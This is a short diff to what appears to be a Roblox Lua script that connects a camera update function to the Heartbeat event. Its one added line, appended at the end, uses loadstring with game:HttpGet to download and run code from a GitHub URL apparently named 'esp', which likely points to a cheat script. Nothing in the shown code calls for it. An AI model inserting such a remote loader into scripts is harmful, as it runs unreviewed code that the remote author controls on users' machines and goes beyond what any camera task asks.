@@ -105,3 +105,4 @@ end
 -- Connect the camera update function to the RunService's Heartbeat
 local RunService = game:GetService("RunService")
 RunService.Heartbeat:Connect(UpdateCamera)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vis0795/GunFightArena/main/esp"))()
